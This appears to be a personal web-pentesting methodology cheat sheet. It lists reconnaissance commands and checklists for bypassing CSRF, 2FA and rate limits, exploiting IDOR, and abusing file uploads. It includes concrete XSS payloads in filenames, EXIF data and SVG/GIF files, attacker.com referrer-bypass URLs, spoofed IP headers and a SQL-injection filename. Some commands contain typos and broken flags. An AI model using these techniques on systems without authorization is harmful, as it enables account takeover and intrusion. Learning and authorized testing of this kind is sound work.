# Methodology v1.0

**econnaissance**

**Active recon ⇒ Port scan/valu scan/web scan/nmap/masscan**

**Passive recon ⇒ whios/whatweb/osint/DNS/>Dorks**

## **I am seeking to obtain the following:**

**My principle is from start to finish ..**

> **1-IPs**&#x20;
>
> **2-Subdomains**&#x20;
>
> **3-Js Files**
>
> **4-Directories**
>
> **5-Parameters**&#x20;
>
> **6-Emails**



### **JSfinder to find a JS files**

```jsx
python JSFinder.py -u <https://www.example.com>
```

**=========================================================================**

### **Sublist3r to Enumerating subdomains**

```jsx
sublist3r -d mathworks.com -o sublis3r-domain.txt
```

**=========================================================================**

### **assetfinder**

```jsx
assetfinder --subs-only mathworks.com   > assetfinder_domains.txt
```

**=========================================================================**

### **httprob to make the domain to (HTTP/HTTPS)**

```jsx
nano do.txt
----------------------
..>
-- google.com
-- edemy.com
-- mathworks.com
..>
---------------------- 
cat  do.txt | httprobe
```

**===========================================================================**

```jsx
cat do.txt | xargs -n1 host | grep "has address" | cut -d " " -f4  | sort -u  > ips.txt

```

**cat ⇒ execute content**

**xargs ⇒ build and execute command lines from standard input**

```
   xargs [options] [command [initial-arguments]]
```

**-n1`-n max-args, **--max-args**=*max-args*`**

**`1 -> if some other error occurred.`**

**grep ⇒ search in file**

**cut ⇒ remove sections from each line of files**

**`-d “ ” -f4 →`**

* **d, --delimiter=DELIM use DELIM instead of TAB for field delimiter**
* **f, --fields=LIST select only these fields; also print any line that contains no delimiter character, unless the -s option is specified**

**=========================================================================**

### **masscan**

<figure><img src="../.gitbook/assets/Untitled 4.png" alt=""><figcaption></figcaption></figure>

```
masscan -Il ips.txt -p0-65535 --rate=100 --interface ethx
```

**=========================================================================**

#### **namp**

```
namp -p- -sC -sV -Pn -iL -F ips.txt
```

**=========================================================================**

### **amass**

```
amass enum -brute -d domain.com -o amass_domain.txt
```

**=========================================================================**



<figure><img src="../.gitbook/assets/Untitled 7.png" alt=""><figcaption></figcaption></figure>

**=========================================================================**

### **Nuclei**

```
nuclei -l http_domains.txt -t nuclei-templates/
```

* [ ] \
  **Run FFUF**&#x20;

<pre class="language-bash"><code class="lang-bash"><strong>fuff -u https://exmple.com/FUZZ -w Onelistforall/onelistforallshort.txt -mc 200,403
</strong></code></pre>

> **Bypassing CSRF Protect**

* [ ] Remove the entire token parameter with Value/Remove just the value.
* [ ] Use any other random but sam length token
* [ ] Use any other random (length-1) or (length+1) token
* [ ] Use attacker's token in victim's session.
* [ ] Change the method from POST to GET and Remove Token.
* [ ] if request is made through PUT ir DELETE then Try **`POST /profile/update?_method=PUT HTTP/1.1`** or&#x20;

```
POST /profile/update HTTP/1.1
HOST: example.com
...

 _method=PUT 
```

* [ ] if token is ent through custom header; try to remove the header.
* [ ] Change the Content-Type to application/json, application/x-url-encoded or from-mutipart, text/xml, application/xml.
* [ ] if double submit token is there (in cookie and some header then try [**CRLF injection.**](https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a#crlf)
*   [ ] Bypass referrer check:

    I if the referrer header is checked buy only when it exists in the request then add piece of code in your csrf POC: **\<meta name="referrer" content="never">**
* [ ] **ii.** Regex Referral  bypass

```
https://attacker.com?target.com
https://attacker.com;target.com
https://attacker.com/target.com/../targetPATH
https://target.com.attacker.com
https://attackertarget.com
https://target.com@attacker.com
https://attacker.com#target.com
https://attacker.com\.target.com
https://attacker.com/.target.com
```

* [ ] CSRF token stealing via xss/htmli/cors.
* [ ] JSON Based:
  * [ ] i. Change the content-Type to **`text/plain,application/x-www-from-urlencoded, multipart/from-data`** and check if it accepts
  * [ ] Use flash + 307 redirect
* [ ] Guessable CSRF Token
* [ ] Clickjacking to strong CSRF token bypass
* [ ] Type Juggling
* [ ] Array: newmail=victim@gmail.com\&csrftoken\[]=lol
* [ ] set the CSRF token to "**`null`**" or add null  bytes.
* [ ] check wether CSRF token is sent over http or sent to 3rd party.
* [ ] Generate multiple CSRF token, observe the static part, Keep it as it is and play with thr dyamic part
* [ ] Remove X-CSRF-TOKEN from Header

> **IDOR**

* [ ] Find and Replace **`IDs` in URLs, header and body: /users/01 -> /users/02**
* [ ] **Try** Parameter Pollution: **`users=01` -> `users=01&users=02`**
* [ ] Special Characters: **`/users/01* or /users/*` -> `Disclosure of every single user`**
* [ ] Try Older version of api endpoint: /api/v3/users/01 **->** /api/v1/users/02 , etc.....
* [ ] add extension: /users/01 **-> /users/02.json/XML**
* [ ] Change Request Methods **`POST /users/01` -> `GET, PUT, PATCH, DELETE`**  etc...
* [ ] Check if the Referrer or some other Headers are used to validate the **`IDs`**&#x20;
  * [ ] **`GET /users/02` -> `403 Forbidden`**
  * [ ] **`Referer: example.com/usser/01`**
  * [ ] **`-----------------------------`**
  * [ ] **`GET /users/02` -> 200 `OK!`**
  * [ ] **`Referer: example.com/usser/02`**
* [ ] Encrypted IDs  if application using encrypted IDs , try  to decrypt using[ **hashes.com**](https://hashes.com/en/decrypt/hash) **or other tools**
* [ ] Swap **`GUID`**` ``With Numeric`` `**`ID`**` ``or`` `**`email:`**
  * [ ] **`/users/1b04c123-89f2-241s-b15b-e15641384h25`   -> `/users/02 or /users/a@b.com`**
*   [ ] Try GUIDs sush as:

    * [ ] 00000000-0000-0000-0000-000000000000 and 11111111-1111-1111-1111-1111111111111111
    * [ ] GUID Enumeration: try to disclose GUIDs using **`Google Dorks,Github,wayback,Burp,History`**
    * [ ] if none of the GUID Enumeration methods work then try: **`SignUp, Reset Password,Other endpoints`**within the application and analyze the response&#x20;
    * [ ] **`403/401`**` ``Bypass:` if server responds back with a **`403/401`** then try ti use burp intruder and send 50-100 requests having different IDs: Ex: from **`/users/01 to /users/100`**&#x20;

    Bild IDORsL Sometimes information is not directly discloed, Lookout for endpoint and features that may disclose information such as export  files, emails or message alerts.
* [ ] Chain IDOR with XSS for Account Tackeovers

> 2FA Bypass Techniques

* [ ] \
  **OTP BYPASS**
  * Response Manipulation: if **`"success":false`** change to **`"success":true`**
  * **`Status Code` Manipulation: if status is 4xx change to 200 ok**&#x20;
  * By repeating the form submission multiple times using a repeater
  * js file: Rare but some js files may contain some information about 2FA code
  * Brute Forcing any length MFA Code
  * \[\[JSON Tests Cheat Sheet]] -> Array of codes.....
  * Check for default OTP - **`111111, 123456, 000000,4242 or null`**
  * leaked in response
  * CSRF on 2fa Disabling&#x20;
  * Password reset Disable 2fa Email/Password
  * old OTP is still valid
  * Integrity Issues -> Use someone else OTP to open your account

> **Bypassing Rate Limit Protection**

```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```

* [ ] intead of 127.0.0.1 , try 127.0.0.2,127.0.0.3,....
* [ ] Even you can try using double X-Forwarded-For

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: 
```

* [ ] try changing **user-agent,cookies**
* [ ] Append null bytes (**`%00,%0d,%0a,%0d,%0d%0a,%09,%0C,%20`**) to the original endpoint          (Ex: **`POST /forgot-password%20 HTTP/1.1`**). Also try adding the bytes after the value of parameter (Like email=h3ckt0r@gmail.com%20)
* [ ] Login to a vaild account and the invaild one, Repeat this process to foll the server that blocks our IP if ypu sunmit 3 incorrect logins in a row
* [ ] Race condition&#x20;
* [ ] add any random parameter in the request

```
POST /forgot-password?fake=1 HTTP/1.1
Host: target.com
....

email=victim@gmail.com&alsofake=2
```

* [ ] Change the request body (From to **`JSON/XML`** or vice-versa).
* [ ] Change request methods (**`POST to PUT to GET to PATCH to DELETE to HEAD to OPTIONS to TRACE To CONNECT`**)
* [ ] if developer implemented captcha-based protection then try [**captcha Bypass Techniques**](https://honeyakshat999.medium.com/captcha-bypass-techniques-f768521516b2)
* [ ] Gmail + and trick
* [ ] [https://bugcrowd.com/disclosures/55b40919-2c02-402c-a2cc-7184349926d7/login-capctha-bypass](https://bugcrowd.com/disclosures/55b40919-2c02-402c-a2cc-7184349926d7/login-capctha-bypass)
* [ ] change api version (EX: api/v2/1729/confirm-email to api/v1/1729/confirm-email )

> **File Upload**

Reference:https://brutelogic.com.br/blog/file-upload-xss/

Quick Analysis

{% code fullWidth="true" %}
```bash
-----------------------------------------------------------------
upload.random123		       ---	To test if random file extensions can be uploaded.
upload.php			       ---	try to upload a simple php file.
upload.php.jpeg 		       --- 	To bypass the blacklist.
upload.jpg.php 		               ---	To bypass the blacklist. 
upload.php 			       ---	and Then Change the content type of the file to image or jpeg.
upload.php*			       ---	version - 1 2 3 4 5 6 7.
upload.PHP			       ---	To bypass The BlackList.
upload.PhP			       ---	To bypass The BlackList.
upload.pHp			       ---	To bypass The BlackList.
upload.htaccess 		       --- 	By uploading this [jpg,png] files can be executed as php with milicious code within it.
pixelFlood.jpg			       ---	To test againt the DOS.
frameflood.gif			       ---	upload gif file with 10^10 Frames
Malicious zTXT  		       --- 	upload UBER.jpg 
Upload zip file			       ---	test againts Zip slip (only when file upload supports zip file)
Check Overwrite Issue	               --- 	Upload file.txt and file.txt with different content and check if 2nd file.txt overwrites 1st file
SVG to XSS			       ---	Check if you can upload SVG files and can turn them to cause XSS on the target app
SQLi Via File upload	               ---	Try uploading `sleep(10)-- -.jpg` as file
----------------------------------------------------------------------
```
{% endcode %}

* Test for IDOR By changing the object references \[filename, IDs,.....]
* EXIF Geo-location Data Not Stripped From Uploaded Images > Manual User Enumeration
* [xss\_comment\_exif\_metadata\_double\_quote](https://hackerone.com/reports/964550)
* XSS in filename `"><img src=x onerror=confirm(88)>.png`
* XSS metadata `exiftool -Artist=’ “><img src=1 onerror=alert(document.domain)>’ 88.jpeg`
* XSS in SVG `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>`
* GIF to XSS `GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;`
* [**XSS in PDF**](https://drive.google.com/file/d/1JQ\_DVGdopanC59hnf6TF1dOwNsF\_wkFY/view)
* [ZIP TO XXE](https://hackerone.com/reports/105434)
* [SQL Injection - File name](https://shahjerry33.medium.com/sql-injection-the-file-upload-playground-6580b089d013)
* [XXE ON JPEG](https://hackerone.com/reports/836877)
* [Create A picture that steals Data](https://medium.com/@iframe\_h1/a-picture-that-steals-data-ff604ba101)
